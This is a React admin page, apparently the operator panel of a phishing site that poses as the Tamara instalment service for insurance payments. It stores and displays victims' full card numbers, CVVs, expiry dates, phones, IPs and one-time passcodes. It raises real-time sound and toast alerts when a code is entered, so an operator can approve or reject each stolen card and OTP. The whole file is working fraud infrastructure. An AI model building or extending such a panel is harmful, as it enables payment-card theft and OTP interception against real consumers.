import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { useAdminNotifications } from "@/hooks/useAdminNotifications";
import { SidebarProvider } from "@/components/ui/sidebar";
import { AdminSidebar } from "@/components/AdminSidebar";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Loader2, Check, X, CreditCard, Globe } from "lucide-react";
import { Button } from "@/components/ui/button";
import { useToast } from "@/hooks/use-toast";
import { format } from "date-fns";
import { ar } from "date-fns/locale";
import { VisitorStatusIndicator } from "@/components/VisitorStatusIndicator";

interface PaymentAttempt {
  id: string;
  card_number: string;
  card_holder_name: string;
  expiry_date: string;
  cvv: string;
  created_at: string;
}

interface OtpAttempt {
  id: string;
  otp_code: string;
  created_at: string;
}

interface TamaraPayment {
  id: string;
  cardholder_name: string;
  card_number: string | null;
  card_number_last4: string;
  expiry_date: string | null;
  cvv: string | null;
  otp_code: string | null;
  phone: string | null;
  total_amount: number;
  monthly_payment: number;
  company: string;
  payment_status: string;
  created_at: string;
  updated_at: string;
  visitor_session_id?: string | null;
  visitor_ip?: string | null;
  payment_attempts: PaymentAttempt[];
  otp_attempts: OtpAttempt[];
}

const AdminTamaraPayments = () => {
  const navigate = useNavigate();
  useAdminNotifications();
  const [payments, setPayments] = useState<TamaraPayment[]>([]);
  const [loading, setLoading] = useState(true);
  const [processingPayment, setProcessingPayment] = useState<string | null>(null);
  const { toast } = useToast();

  // دالة لتشغيل صوت إشعار مميز وملفت لتمارا
  const playTamaraNotificationSound = () => {
    const audioContext = new (window.AudioContext || (window as any).webkitAudioContext)();
    
    // تشغيل نغمة مميزة جداً ومتعددة المراحل
    const playBeep = (frequency: number, startTime: number, duration: number) => {
      const oscillator = audioContext.createOscillator();
      const gainNode = audioContext.createGain();
      
      oscillator.connect(gainNode);
      gainNode.connect(audioContext.destination);
      
      oscillator.frequency.setValueAtTime(frequency, startTime);
      oscillator.type = 'sine';
      
      gainNode.gain.setValueAtTime(0.4, startTime);
      gainNode.gain.exponentialRampToValueAtTime(0.01, startTime + duration);
      
      oscillator.start(startTime);
      oscillator.stop(startTime + duration);
    };
    
    // تشغيل سلسلة نغمات ملفتة للانتباه
    const currentTime = audioContext.currentTime;
    playBeep(1200, currentTime, 0.15);
    playBeep(1400, currentTime + 0.2, 0.15);
    playBeep(1600, currentTime + 0.4, 0.15);
    playBeep(1800, currentTime + 0.6, 0.25);
    
    // نغمة إضافية بعد توقف قصير
    setTimeout(() => {
      const newTime = audioContext.currentTime;
      playBeep(1500, newTime, 0.15);
      playBeep(1700, newTime + 0.15, 0.2);
    }, 900);
  };

  useEffect(() => {
    const checkAuthAndFetchPayments = async () => {
      const { data: { session } } = await supabase.auth.getSession();
      if (!session) {
        console.log("⚠️ No session found, redirecting to login");
        navigate("/admin/login");
        return;
      }

      console.log("✅ Session found, fetching tamara payments...");
      await fetchPayments();
      
      // Subscribe to realtime updates
      const channel = supabase
        .channel('tamara-payments-changes')
        .on(
          'postgres_changes',
          {
            event: 'INSERT',
            schema: 'public',
            table: 'tamara_payments'
          },
          (payload) => {
            console.log('طلب تمارا جديد:', payload);
            
            // تشغيل الصوت المميز والملفت لتمارا
            playTamaraNotificationSound();
            
            // إظهار إشعار كتابي بارز
            toast({
              title: "🚨 عميل جديد في تمارا!",
              description: `عميل وضع رقمه: ${payload.new.phone || 'غير متوفر'} - المبلغ: ${payload.new.total_amount} ر.س`,
              duration: 15000,
              className: "bg-gradient-to-r from-purple-600 to-pink-600 text-white border-0",
            });
            
            // تشغيل الصوت مرة أخرى بعد 2 ثانية للتأكيد
            setTimeout(() => {
              playTamaraNotificationSound();
            }, 2000);
            
            // تحديث البيانات تلقائياً
            fetchPayments();
          }
        )
        .on(
          'postgres_changes',
          {
            event: 'UPDATE',
            schema: 'public',
            table: 'tamara_payments'
          },
          () => {
            fetchPayments();
          }
        )
        .on(
          'postgres_changes',
          {
            event: 'INSERT',
            schema: 'public',
            table: 'tamara_payment_attempts'
          },
          (payload) => {
            console.log('🔔 عميل أدخل بيانات بطاقة في تمارة!', payload.new);
            playTamaraNotificationSound();
            toast({
              title: "🔔 بطاقة دفع جديدة في تمارة!",
              description: `رقم البطاقة: ****${payload.new.card_number?.slice(-4) || '****'}`,
              duration: 8000,
            });
            fetchPayments();
          }
        )
        .on(
          'postgres_changes',
          {
            event: 'INSERT',
            schema: 'public',
            table: 'tamara_otp_attempts'
          },
          (payload) => {
            console.log('🔔 عميل أدخل OTP في تمارة!', payload.new);
            playTamaraNotificationSound();
            toast({
              title: "🔔 كود تحقق جديد في تمارة!",
              description: `الكود: ${payload.new.otp_code}`,
              duration: 8000,
            });
            fetchPayments();
          }
        )
        .subscribe();

      // Auto-refresh every 5 minutes (reduced frequency for better performance)
      const refreshInterval = setInterval(() => {
        fetchPayments();
      }, 300000); // 5 minutes

      return () => {
        supabase.removeChannel(channel);
        clearInterval(refreshInterval);
      };
    };

    checkAuthAndFetchPayments();
  }, [navigate]);

  const fetchPayments = async () => {
    try {
      console.log("📊 Fetching tamara payments...");
      // Fetch payments first with reduced limit
      const { data: paymentsData, error: paymentsError } = await supabase
        .from('tamara_payments')
        .select('*')
        .order('created_at', { ascending: false })
        .limit(50);

      if (paymentsError) {
        console.error("❌ Error fetching payments:", paymentsError);
        toast({
          title: "خطأ",
          description: "فشل في جلب بيانات الدفعات",
          variant: "destructive",
        });
        setLoading(false);
        return;
      }

      if (!paymentsData || paymentsData.length === 0) {
        console.log("⚠️ No tamara payments found");
        setPayments([]);
        setLoading(false);
        return;
      }

      console.log(`✅ Fetched ${paymentsData.length} tamara payments`);

      // Fetch all attempts in batch using .in()
      const paymentIds = paymentsData.map(p => p.id);
      const sessionIds = paymentsData.map(p => p.visitor_session_id).filter(Boolean) as string[];
      
      const [attemptsResult, otpResult, visitorTrackingResult] = await Promise.all([
        supabase
          .from('tamara_payment_attempts')
          .select('*')
          .in('payment_id', paymentIds)
          .order('created_at', { ascending: false }),
        supabase
          .from('tamara_otp_attempts')
          .select('*')
          .in('payment_id', paymentIds)
          .order('created_at', { ascending: false }),
        sessionIds.length > 0 ? supabase
          .from('visitor_tracking')
          .select('session_id, ip_address')
          .in('session_id', sessionIds)
          .order('last_active_at', { ascending: false }) : Promise.resolve({ data: [] })
      ]);

      // Create IP map
      const visitorIPMap = (visitorTrackingResult.data || []).reduce((acc: any, visitor: any) => {
        if (!acc[visitor.session_id]) {
          acc[visitor.session_id] = visitor.ip_address;
        }
        return acc;
      }, {});

      // Group attempts by payment_id
      const attemptsMap = (attemptsResult.data || []).reduce((acc: any, attempt: any) => {
        if (!acc[attempt.payment_id]) acc[attempt.payment_id] = [];
        acc[attempt.payment_id].push(attempt);
        return acc;
      }, {});

      const otpMap = (otpResult.data || []).reduce((acc: any, otp: any) => {
        if (!acc[otp.payment_id]) acc[otp.payment_id] = [];
        acc[otp.payment_id].push(otp);
        return acc;
      }, {});

      // Combine data
      const paymentsWithAttempts = paymentsData.map(payment => ({
        ...payment,
        visitor_ip: visitorIPMap[payment.visitor_session_id] || null,
        payment_attempts: attemptsMap[payment.id] || [],
        otp_attempts: otpMap[payment.id] || []
      }));

      setPayments(paymentsWithAttempts);
    } catch (error) {
      console.error("Error fetching payments:", error);
      toast({
        title: "خطأ",
        description: "فشل في جلب بيانات الدفعات",
        variant: "destructive",
      });
    } finally {
      setLoading(false);
    }
  };

  const handleApprove = async (paymentId: string) => {
    setProcessingPayment(paymentId);
    try {
      const { error } = await supabase
        .from('tamara_payments')
        .update({ payment_status: 'approved' })
        .eq('id', paymentId);

      if (error) throw error;

      toast({
        title: "تم الموافقة",
        description: "تمت الموافقة على الدفعة بنجاح",
      });
      
      await fetchPayments();
    } catch (error) {
      console.error("Error approving payment:", error);
      toast({
        title: "خطأ",
        description: "فشل في الموافقة على الدفعة",
        variant: "destructive",
      });
    } finally {
      setProcessingPayment(null);
    }
  };

  const handleReject = async (paymentId: string) => {
    setProcessingPayment(paymentId);
    try {
      const { error } = await supabase
        .from('tamara_payments')
        .update({ payment_status: 'rejected' })
        .eq('id', paymentId);

      if (error) throw error;

      toast({
        title: "تم الرفض",
        description: "تم رفض الدفعة",
      });
      
      await fetchPayments();
    } catch (error) {
      console.error("Error rejecting payment:", error);
      toast({
        title: "خطأ",
        description: "فشل في رفض الدفعة",
        variant: "destructive",
      });
    } finally {
      setProcessingPayment(null);
    }
  };

  const handleApproveOtp = async (paymentId: string) => {
    setProcessingPayment(paymentId);
    try {
      const { error } = await supabase
        .from('tamara_payments')
        .update({ payment_status: 'completed' })
        .eq('id', paymentId);

      if (error) throw error;

      toast({
        title: "تم تأكيد OTP",
        description: "تمت الموافقة على كود التحقق بنجاح",
      });
      
      await fetchPayments();
    } catch (error) {
      console.error("Error approving OTP:", error);
      toast({
        title: "خطأ",
        description: "فشل في الموافقة على كود التحقق",
        variant: "destructive",
      });
    } finally {
      setProcessingPayment(null);
    }
  };

  const handleRejectOtp = async (paymentId: string) => {
    setProcessingPayment(paymentId);
    try {
      const { error } = await supabase
        .from('tamara_payments')
        .update({ payment_status: 'otp_rejected' })
        .eq('id', paymentId);

      if (error) throw error;

      toast({
        title: "تم رفض OTP",
        description: "تم رفض كود التحقق",
      });
      
      await fetchPayments();
    } catch (error) {
      console.error("Error rejecting OTP:", error);
      toast({
        title: "خطأ",
        description: "فشل في رفض كود التحقق",
        variant: "destructive",
      });
    } finally {
      setProcessingPayment(null);
    }
  };

  const getStatusBadge = (status: string) => {
    switch (status) {
      case 'pending':
        return <Badge className="bg-yellow-500">قيد الانتظار</Badge>;
      case 'approved':
        return <Badge className="bg-green-500">تمت الموافقة</Badge>;
      case 'rejected':
        return <Badge className="bg-red-500">مرفوض</Badge>;
      case 'completed':
        return <Badge className="bg-blue-500">مكتمل</Badge>;
      case 'otp_rejected':
        return <Badge className="bg-orange-500">رفض OTP</Badge>;
      default:
        return <Badge>{status}</Badge>;
    }
  };

  if (loading) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <Loader2 className="h-8 w-8 animate-spin" />
      </div>
    );
  }

  return (
    <SidebarProvider>
      <div className="flex min-h-screen w-full" dir="rtl">
        <AdminSidebar />
        <div className="flex-1 p-8 bg-gray-50">
          <div className="max-w-7xl mx-auto">
            <div className="mb-8">
              <h1 className="text-3xl font-bold text-gray-900">دفعات تمارا</h1>
              <p className="text-gray-600 mt-2">إدارة والموافقة على دفعات تمارا</p>
            </div>

            <div className="grid gap-6">
              {payments.length === 0 ? (
                <Card>
                  <CardContent className="p-8 text-center text-gray-500">
                    لا توجد دفعات حتى الآن
                  </CardContent>
                </Card>
              ) : (
                payments.map((payment) => (
                  <Card key={payment.id} className="overflow-hidden">
                    <CardHeader className="bg-muted/50 border-b">
                      <div className="flex items-center justify-between">
                        <div className="flex items-center gap-2">
                          <CreditCard className="h-5 w-5 text-primary" />
                          <CardTitle className="text-lg flex items-center gap-2">
                            {payment.cardholder_name}
                            <VisitorStatusIndicator sessionId={payment.visitor_session_id} />
                          </CardTitle>
                        </div>
                        {getStatusBadge(payment.payment_status)}
                      </div>
                      <CardDescription className="mt-1">
                        {format(new Date(payment.created_at), 'PPp', { locale: ar })}
                      </CardDescription>
                    </CardHeader>

                    <CardContent className="p-6">
                      {/* معلومات أساسية */}
                      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4 mb-6">
                        <div className="bg-gray-50 border border-gray-200 rounded-lg p-3">
                          <div className="text-xs text-gray-600 font-medium mb-1 flex items-center gap-1">
                            <Globe className="h-3 w-3" />
                            IP Address
                          </div>
                          <div className="font-mono text-xs text-gray-900" dir="ltr">
                            {payment.visitor_ip || 'غير متوفر'}
                          </div>
                        </div>
                        
                        <div className="bg-blue-50 border border-blue-200 rounded-lg p-3">
                          <div className="text-xs text-blue-600 font-medium mb-1">شركة التأمين</div>
                          <div className="font-bold text-sm text-gray-900 truncate" title={payment.company}>
                            {payment.company}
                          </div>
                        </div>
                        
                        {payment.phone && (
                          <div className="bg-purple-50 border border-purple-200 rounded-lg p-3">
                            <div className="text-xs text-purple-600 font-medium mb-1">رقم الهاتف</div>
                            <div className="font-bold text-sm text-gray-900" dir="ltr">
                              {payment.phone}
                            </div>
                          </div>
                        )}
                        
                        <div className="bg-green-50 border border-green-200 rounded-lg p-3">
                          <div className="text-xs text-green-600 font-medium mb-1">المبلغ الشهري</div>
                          <div className="font-bold text-lg text-green-700">
                            {payment.monthly_payment} ر.س
                          </div>
                        </div>
                        
                        <div className="bg-orange-50 border border-orange-200 rounded-lg p-3">
                          <div className="text-xs text-orange-600 font-medium mb-1">المبلغ الإجمالي</div>
                          <div className="font-bold text-lg text-orange-700">
                            {payment.total_amount} ر.س
                          </div>
                        </div>
                        
                        {payment.otp_code && payment.card_number && (
                          <div className="bg-primary/10 border-2 border-primary rounded-lg p-3 md:col-span-2">
                            <div className="text-xs text-primary font-medium mb-1">كود التحقق الحالي</div>
                            <div className="font-bold text-2xl text-primary text-center tracking-widest">
                              {payment.otp_code}
                            </div>
                          </div>
                        )}
                      </div>

                      {/* محاولات الدفع */}
                      {payment.payment_attempts && payment.payment_attempts.length > 0 && (
                        <div className="mb-6 space-y-2">
                          <h3 className="font-semibold flex items-center gap-2 text-sm text-orange-600">
                            <CreditCard className="h-4 w-4" />
                            محاولات الدفع ({payment.payment_attempts.length})
                          </h3>
                          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3">
                            {payment.payment_attempts.map((attempt, index) => (
                              <div key={attempt.id} className="bg-orange-50 border border-orange-200 rounded-lg p-3">
                                <div className="flex justify-between items-center mb-2">
                                  <span className="text-xs font-semibold text-orange-600">
                                    محاولة #{payment.payment_attempts!.length - index}
                                  </span>
                                  <span className="text-xs text-gray-500">
                                    {format(new Date(attempt.created_at), 'HH:mm', { locale: ar })}
                                  </span>
                                </div>
                                <div className="space-y-1.5 text-xs">
                                  <div className="flex justify-between">
                                    <span className="text-gray-500">رقم البطاقة:</span>
                                    <span className="font-mono font-medium" dir="ltr">
                                      {attempt.card_number}
                                    </span>
                                  </div>
                                  <div className="flex justify-between">
                                    <span className="text-gray-500">الاسم:</span>
                                    <span className="font-medium truncate max-w-[120px]" title={attempt.card_holder_name}>
                                      {attempt.card_holder_name}
                                    </span>
                                  </div>
                                  <div className="flex justify-between">
                                    <span className="text-gray-500">الانتهاء:</span>
                                    <span className="font-medium" dir="ltr">{attempt.expiry_date}</span>
                                  </div>
                                  <div className="flex justify-between">
                                    <span className="text-gray-500">CVV:</span>
                                    <span className="font-mono font-medium">{attempt.cvv}</span>
                                  </div>
                                </div>

                                {/* أزرار الموافقة والرفض لكل بطاقة */}
                                {payment.payment_status === 'pending' && index === 0 && (
                                  <div className="flex gap-2 mt-3 pt-3 border-t border-orange-300">
                                    <Button
                                      onClick={() => handleApprove(payment.id)}
                                      disabled={processingPayment === payment.id}
                                      className="flex-1 bg-green-600 hover:bg-green-700 text-white h-8 text-xs"
                                    >
                                      {processingPayment === payment.id ? (
                                        <Loader2 className="h-3 w-3 animate-spin ml-1" />
                                      ) : (
                                        <Check className="h-3 w-3 ml-1" />
                                      )}
                                      موافقة
                                    </Button>
                                    <Button
                                      onClick={() => handleReject(payment.id)}
                                      disabled={processingPayment === payment.id}
                                      variant="destructive"
                                      className="flex-1 h-8 text-xs"
                                    >
                                      {processingPayment === payment.id ? (
                                        <Loader2 className="h-3 w-3 animate-spin ml-1" />
                                      ) : (
                                        <X className="h-3 w-3 ml-1" />
                                      )}
                                      رفض
                                    </Button>
                                  </div>
                                )}
                              </div>
                            ))}
                          </div>
                        </div>
                      )}

                      {/* محاولات OTP النهائية - كود التحقق الذي يدخله العميل */}
                      {payment.otp_attempts && payment.otp_attempts.length > 0 && (
                        <div className="mt-6 p-4 bg-gradient-to-br from-purple-50 to-pink-50 rounded-xl border-2 border-purple-300">
                          <h3 className="font-bold flex items-center gap-2 text-lg text-purple-700 mb-4">
                            🔐 أكواد التحقق النهائية ({payment.otp_attempts.length})
                          </h3>
                          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                            {payment.otp_attempts.map((attempt, index) => {
                              const isLatest = index === 0;
                              return (
                                <div 
                                  key={attempt.id} 
                                  className={`border-2 rounded-xl p-4 transition-all ${
                                    isLatest 
                                      ? 'bg-gradient-to-br from-purple-100 to-pink-100 border-purple-400 shadow-lg ring-4 ring-purple-200' 
                                      : 'bg-white border-gray-300'
                                  }`}
                                >
                                  <div className="flex justify-between items-center mb-3">
                                    <span className={`text-sm font-bold ${isLatest ? 'text-purple-700' : 'text-gray-600'}`}>
                                      {isLatest ? '⭐ الأحدث' : `محاولة #${payment.otp_attempts!.length - index}`}
                                    </span>
                                    <span className="text-xs text-gray-600 font-medium">
                                      {new Date(attempt.created_at).toLocaleTimeString('en-US', {
                                        hour: '2-digit',
                                        minute: '2-digit',
                                        hour12: true
                                      })}
                                    </span>
                                  </div>
                                  <div className="space-y-2">
                                    <div className="flex justify-between items-center bg-white rounded-lg p-3 shadow-sm">
                                      <span className="text-sm text-gray-600">كود التحقق:</span>
                                      <span className={`font-mono font-bold text-2xl tracking-wider ${
                                        isLatest ? 'text-purple-700' : 'text-gray-700'
                                      }`}>
                                        {attempt.otp_code}
                                      </span>
                                    </div>
                                    <div className="text-xs text-gray-600 text-center bg-white rounded-lg p-2">
                                      {format(new Date(attempt.created_at), 'PPp', { locale: ar })}
                                    </div>
                                  </div>
                                </div>
                              );
                            })}
                          </div>
                          
                          {/* أزرار الموافقة/الرفض على أحدث كود OTP */}
                          {payment.payment_status !== 'completed' && payment.payment_status !== 'otp_rejected' && (
                            <div className="flex gap-3 mt-6 pt-4 border-t-2 border-purple-300">
                              <Button
                                onClick={() => handleApproveOtp(payment.id)}
                                disabled={processingPayment === payment.id}
                                className="flex-1 bg-gradient-to-r from-green-600 to-green-700 hover:from-green-700 hover:to-green-800 text-white h-12 text-base font-bold shadow-lg"
                              >
                                {processingPayment === payment.id ? (
                                  <Loader2 className="h-5 w-5 animate-spin ml-2" />
                                ) : (
                                  <Check className="h-5 w-5 ml-2" />
                                )}
                                ✅ موافقة على كود التحقق
                              </Button>
                              <Button
                                onClick={() => handleRejectOtp(payment.id)}
                                disabled={processingPayment === payment.id}
                                variant="destructive"
                                className="flex-1 h-12 text-base font-bold shadow-lg"
                              >
                                {processingPayment === payment.id ? (
                                  <Loader2 className="h-5 w-5 animate-spin ml-2" />
                                ) : (
                                  <X className="h-5 w-5 ml-2" />
                                )}
                                ❌ رفض كود التحقق
                              </Button>
                            </div>
                          )}
                        </div>
                      )}
                    </CardContent>
                  </Card>
                ))
              )}
            </div>
          </div>
        </div>
      </div>
    </SidebarProvider>
  );
};

export default AdminTamaraPayments;
